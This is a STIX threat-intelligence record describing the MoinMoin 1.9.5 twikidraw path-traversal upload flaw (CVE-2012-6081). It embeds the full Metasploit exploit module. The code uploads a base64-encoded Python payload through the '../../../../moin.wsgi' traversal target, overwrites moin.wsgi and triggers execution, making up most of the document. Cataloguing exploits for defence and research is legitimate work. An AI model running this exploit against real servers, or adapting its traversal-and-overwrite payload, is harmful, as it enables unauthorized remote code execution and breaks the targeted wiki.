{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--510ed77e-2c83-4f32-a9ca-2266c311d1cd",
    "created": "2024-08-14T17:13:48.218573Z",
    "modified": "2024-08-14T17:13:48.218577Z",
    "name": "MoinMoin twikidraw Action Traversal File Upload",
    "description": " This module exploits a vulnerability in MoinMoin 1.9.5. The vulnerability exists on the manage of the twikidraw actions, where a traversal path can be used in order to upload arbitrary files. Exploitation is achieved on Apached/mod_wsgi configurations by overwriting moin.wsgi, which allows to execute arbitrary python code, as exploited in the wild on July, 2012. This module is \"ManualRanking,\" and the user is warned to use this module at his own risk since it will overwrite the moin.wsgi file, required for the correct working of the MoinMoin wiki. While the exploit will try to restore the attacked application at post exploitation, successful restoration cannot be guaranteed. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/moinmoin_twikidraw.rb",
            "external_id": "moinmoin_twikidraw.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-6081"
        },
        {
            "source_name": "reference",
            "url": "http://hg.moinmo.in/moin/1.9/rev/7e7e1cbb9d3f"
        },
        {
            "source_name": "reference",
            "url": "http://wiki.python.org/moin/WikiAttack2013"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MoinMoin twikidraw Action Traversal File Upload',\n      'Description'    => %q{\n          This module exploits a vulnerability in MoinMoin 1.9.5. The vulnerability\n        exists on the manage of the twikidraw actions, where a traversal path can be used\n        in order to upload arbitrary files. Exploitation is achieved on Apached/mod_wsgi\n        configurations by overwriting moin.wsgi, which allows to execute arbitrary python\n        code, as exploited in the wild on July, 2012. This module is \"ManualRanking,\" and\n        the user is warned to use this module at his own risk since it will overwrite the\n        moin.wsgi file, required for the correct working of the MoinMoin wiki. While the\n        exploit will try to restore the attacked application at post exploitation, successful\n        restoration cannot be guaranteed.\n      },\n      'Author'         =>\n        [\n          'Unknown', # Vulnerability discovery\n          'HTP', # PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-6081' ],\n          [ 'OSVDB', '88825' ],\n          [ 'BID', '57082' ],\n          [ 'EDB', '25304' ],\n          [ 'URL', 'http://hg.moinmo.in/moin/1.9/rev/7e7e1cbb9d3f' ],\n          [ 'URL', 'http://wiki.python.org/moin/WikiAttack2013' ]\n        ],\n      'Privileged'     => false, # web server context\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 16384, # Enough one to fit any payload\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic telnet netcat perl'\n            }\n        },\n      'Platform'       => [ 'unix' ],\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'MoinMoin 1.9.5', { }]],\n      'DisclosureDate' => '2012-12-30',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"MoinMoin base path\", \"/\" ]),\n        OptString.new('WritablePage', [ true, \"MoinMoin Page with edit permissions to inject the payload, by default WikiSandbox (Ex: /WikiSandbox)\", \"/WikiSandBox\" ]),\n        OptString.new('USERNAME', [ false,  \"The user to authenticate as (anonymous if username not provided)\"]),\n        OptString.new('PASSWORD', [ false,  \"The password to authenticate with (anonymous if password not provided)\" ])\n      ])\n\n    self.needs_cleanup = true\n  end\n\n  def post_auth?\n    true\n  end\n\n  def moinmoin_template(path)\n    template =[]\n    template << \"# -*- coding: iso-8859-1 -*-\"\n    template << \"import sys, os\"\n    template << \"sys.path.insert(0, 'PATH')\".gsub(/PATH/, File.dirname(path))\n    template << \"from MoinMoin.web.serving import make_application\"\n    template << \"application = make_application(shared=True)\"\n    return template\n  end\n\n  def restore_file(session, file, contents)\n    first = true\n    contents.each {|line|\n      if first\n        session.shell_command_token(\"echo \\\"#{line}\\\" > #{file}\")\n        first = false\n      else\n        session.shell_command_token(\"echo \\\"#{line}\\\" >> #{file}\")\n      end\n    }\n  end\n\n  # Try to restore a basic moin.wsgi file with the hope of making the\n  # application usable again.\n  # Try to search on /usr/local/share/moin (default search path) and the\n  # current path (apache user home). Avoiding to search on \"/\" because it\n  # could took long time to finish.\n  def on_new_session(session)\n    print_status(\"Trying to restore moin.wsgi...\")\n    begin\n      files = session.shell_command_token(\"find `pwd` -name moin.wsgi 2> /dev/null\")\n      files.split.each { |file|\n        print_status(\"#{file} found! Trying to restore...\")\n        restore_file(session, file, moinmoin_template(file))\n      }\n\n      files = session.shell_command_token(\"find /usr/local/share/moin -name moin.wsgi 2> /dev/null\")\n      files.split.each { |file|\n        print_status(\"#{file} found! Trying to restore...\")\n        restore_file(session, file, moinmoin_template(file))\n      }\n      print_warning(\"Finished. If application isn't usable, manual restore of the moin.wsgi file would be required.\")\n    rescue\n      print_warning(\"Error while restring moin.wsgi, manual restoring would be required.\")\n    end\n  end\n\n  def do_login(username, password)\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(@base, @page),\n      'vars_post' =>\n        {\n          'action' => 'login',\n          'name' => username,\n          'password' => password,\n          'login' => 'Login'\n        }\n      })\n\n    if not res or res.code != 200 or not res.headers.include?('Set-Cookie')\n      return nil\n    end\n\n    return res.get_cookies\n\n  end\n\n  def upload_code(session, code)\n\n    vprint_status(\"Retrieving the ticket...\")\n\n    res = send_request_cgi({\n      'uri'      => normalize_uri(@base, @page),\n      'cookie'   => session,\n      'vars_get' => {\n        'action' => 'twikidraw',\n        'do'     => 'modify',\n        'target' => '../../../../moin.wsgi'\n      }\n    })\n\n    if not res or res.code != 200 or res.body !~ /ticket=(.*?)&amp;target/\n      vprint_error(\"Error retrieving the ticket\")\n      return nil\n    end\n\n    ticket = $1\n    vprint_good(\"Ticket found: #{ticket}\")\n\n    my_payload = \"[MARK]#{code}[MARK]\"\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\"drawing.r if()else[]\\nexec eval(\\\"open(__file__)\\\\56read()\\\\56split('[MARK]')[-2]\\\\56strip('\\\\\\\\0')\\\")\", nil, nil, \"form-data; name=\\\"filename\\\"\")\n    post_data.add_part(my_payload, \"image/png\", nil, \"form-data; name=\\\"filepath\\\"; filename=\\\"drawing.png\\\"\")\n    my_data = post_data.to_s\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(@base, @page),\n      'cookie'   => session,\n      'vars_get' =>\n      {\n        'action' => 'twikidraw',\n        'do'     => 'save',\n        'ticket' => ticket,\n        'target' => '../../../../moin.wsgi'\n      },\n      'data'     => my_data,\n      'ctype'    => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n\n    if not res or res.code != 200 or not res.body.empty?\n      vprint_error(\"Error uploading the payload\")\n      return nil\n    end\n\n    return true\n  end\n\n  def check\n    @base = target_uri.path\n    @base << '/' if @base[-1, 1] != '/'\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(@base)\n    })\n\n    if res and res.code == 200 and res.body =~ /moinmoin/i and res.headers['Server'] =~ /Apache/\n      return Exploit::CheckCode::Detected\n    elsif res\n      return Exploit::CheckCode::Unknown\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def writable_page?(session)\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(@base, @page),\n      'cookie' => session,\n    })\n\n    if not res or res.code != 200 or res.body !~ /Edit \\(Text\\)/\n      return false\n    end\n\n    return true\n  end\n\n  def exploit\n\n    # Init variables\n    @page = datastore['WritablePage']\n\n    @base = target_uri.path\n    @base << '/' if @base[-1, 1] != '/'\n\n    # Login if needed\n    if (datastore['USERNAME'] and\n      not datastore['USERNAME'].empty? and\n      datastore['PASSWORD'] and\n      not datastore['PASSWORD'].empty?)\n      print_status(\"Trying login to get session ID...\")\n      session = do_login(datastore['USERNAME'], datastore['PASSWORD'])\n    else\n      print_status(\"Using anonymous access...\")\n      session = \"\"\n    end\n\n    # Check authentication\n    if not session\n      fail_with(Failure::NoAccess, \"Error getting a session ID, check credentials or WritablePage option\")\n    end\n\n    # Check writable permissions\n    if not writable_page?(session)\n      fail_with(Failure::NoAccess, \"There are no write permissions on #{@page}\")\n    end\n\n    # Upload payload\n    print_status(\"Trying to upload payload...\")\n    python_cmd = \"import sys, os\\n\"\n    python_cmd << \"os.system(\\\"#{Rex::Text.encode_base64(payload.encoded)}\\\".decode(\\\"base64\\\"))\\n\"\n    python_cmd << \"sys.path.insert(0, '/usr/local/share/moin')\\n\"\n    python_cmd << \"from MoinMoin.web.serving import make_application\\n\"\n    python_cmd << \"application = make_application(shared=True)\"\n    res = upload_code(session, \"exec('#{Rex::Text.encode_base64(python_cmd)}'.decode('base64'))\")\n    if not res\n      fail_with(Failure::Unknown, \"Error uploading the payload\")\n    end\n\n    # Execute payload\n    print_status(\"Executing the payload...\")\n    res = send_request_cgi({\n      'uri'      => normalize_uri(@base, @page),\n      'cookie' => session,\n      'vars_get' => {\n        'action' => 'AttachFile'\n      }\n    }, 5)\n\n  end\nend\n\n\n",
    "x_mitre_disclosure_date": "2012-12-30",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}